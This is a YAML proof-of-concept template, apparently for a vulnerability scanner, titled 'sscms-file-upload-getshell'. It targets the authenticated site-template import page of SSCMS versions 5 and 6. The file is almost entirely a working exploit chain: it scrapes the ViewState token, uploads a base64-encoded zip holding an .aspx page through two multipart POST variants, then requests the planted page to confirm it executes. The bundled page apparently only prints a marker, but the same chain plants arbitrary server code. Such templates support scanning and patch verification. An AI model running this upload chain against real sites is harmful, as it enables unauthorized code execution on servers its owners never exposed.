name: poc-yaml-sscms-file-upload-getshell
binding: 9528163e-9071-4bac-9d2b-e8b0e9b1ca57
manual: true
detail:
    author: secking
    links:
        - https://github.com/siteserver/cms
    vulnerability:
        id: CT-529817
        level: high
    description: sscms v5.x-6.x 后台站点模板导入功能可getshell （需登录）
    warning: 注意该脚本会上传文件产生一个临时的无害文件
transport: http
set:
    r5: randomLowercase(6)
    rboundary: randomInt(40000, 44800)
    shell: base64Decode("UEsDBBQAAAAIAAlDbVUr6o+7awAAAG0AAAAlAAAAMjUwN2U0ZTk0NDg1ZWNmZWQxMDUyYzYxNmNjZDMxMzguYXNweA3GwQqCQBAG4FdZBhbsEpliC6l0lg7hpfO0848siJmz9vz1nb7W39yDJ7g7L9P+T0eDxS2tmdyX5yScMeKzw3JHyrOBnO9bP8LW92I4PreUUVBTx3CulKWUcMFJtIRWUfAKHJtQKx2uvv8BUEsBAhQAFAAAAAgACUNtVSvqj7trAAAAbQAAACUAAAAAAAAAAQAgAAAAAAAAADI1MDdlNGU5NDQ4NWVjZmVkMTA1MmM2MTZjY2QzMTM4LmFzcHhQSwUGAAAAAAEAAQBTAAAArgAAAAAA")
rules:
    r0:
        request:
            cache: false
            method: GET
            path: /SiteServer/settings/modalImportZip.aspx?type=SiteTemplate
        expression: response.status == 200 && response.content_type.contains("html") && response.body.bcontains(bytes("modalImportZip.aspx?type=SiteTemplate"))
        output:
            search: '''<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="(?P<VIEWSTATE>.+?)" />''.bsubmatch(response.body)'
            VIEWSTATE: search["VIEWSTATE"]
    r6x:
        request:
            cache: false
            method: POST
            path: /SiteServer/settings/modalimportzip.aspx?type=SiteTemplate
            headers:
                Content-Type: multipart/form-data; boundary=---------------------------24601788453441871193880186155
            body: "-----------------------------24601788453441871193880186155\r\nContent-Disposition: form-data; name=\"__EVENTTARGET\"\r\n\r\n\r\n-----------------------------24601788453441871193880186155\r\nContent-Disposition: form-data; name=\"__EVENTARGUMENT\"\r\n\r\n\r\n-----------------------------24601788453441871193880186155\r\nContent-Disposition: form-data; name=\"__LASTFOCUS\"\r\n\r\n\r\n-----------------------------24601788453441871193880186155\r\nContent-Disposition: form-data; name=\"__VIEWSTATE\"\r\n\r\n{{VIEWSTATE}}\r\n-----------------------------24601788453441871193880186155\r\nContent-Disposition: form-data; name=\"__VIEWSTATEGENERATOR\"\r\n\r\nFE23FAC4\r\n-----------------------------24601788453441871193880186155\r\nContent-Disposition: form-data; name=\"DdlImportType\"\r\n\r\nTrue\r\n-----------------------------24601788453441871193880186155\r\nContent-Disposition: form-data; name=\"HifFile\"; filename=\"{{r5}}.zip\"\r\nContent-Type: application/zip\r\n\r\n{{shell}}\r\n-----------------------------24601788453441871193880186155\r\nContent-Disposition: form-data; name=\"ctl04\"\r\n\r\n确 定\r\n-----------------------------24601788453441871193880186155--\r\n"
            follow_redirects: false
        expression: response.status == 200 && response.body.ibcontains(b"pageSiteTemplate.aspx")
    r5x:
        request:
            cache: false
            method: POST
            path: /SiteServer/settings/modalimportzip.aspx?type=SiteTemplate
            headers:
                Content-Type: multipart/form-data; boundary=---------------------------24601788453441871193880186155
            body: "-----------------------------24601788453441871193880186155\r\nContent-Disposition: form-data; name=\"__EVENTTARGET\"\r\n\r\nbtnSubmit\r\n-----------------------------24601788453441871193880186155\r\nContent-Disposition: form-data; name=\"__EVENTARGUMENT\"\r\n\r\n\r\n-----------------------------24601788453441871193880186155\r\nContent-Disposition: form-data; name=\"__LASTFOCUS\"\r\n\r\n\r\n-----------------------------24601788453441871193880186155\r\nContent-Disposition: form-data; name=\"__VIEWSTATE\"\r\n\r\n{{VIEWSTATE}}\r\n-----------------------------24601788453441871193880186155\r\nContent-Disposition: form-data; name=\"__VIEWSTATEGENERATOR\"\r\n\r\nFE23FAC4\r\n-----------------------------24601788453441871193880186155\r\nContent-Disposition: form-data; name=\"RblImportType\"\r\n\r\nTrue\r\n-----------------------------24601788453441871193880186155\r\nContent-Disposition: form-data; name=\"HifFile\"; filename=\"{{r5}}.zip\"\r\nContent-Type: application/zip\r\n\r\n{{shell}}\r\n-----------------------------24601788453441871193880186155--\r\n"
            follow_redirects: false
        expression: response.status == 200 && response.body.ibcontains(b"pagesitetemplate.aspx")
    r3:
        request:
            cache: false
            method: GET
            path: /SiteFiles/SiteTemplates/{{r5}}/2507e4e94485ecfed1052c616ccd3138.aspx
        expression: response.status == 200 && response.body.ibcontains(b"64c823fad1d87e0df1ef3cdeb8ac684f")
expression: r0() && (r5x() || r6x()) && r3()
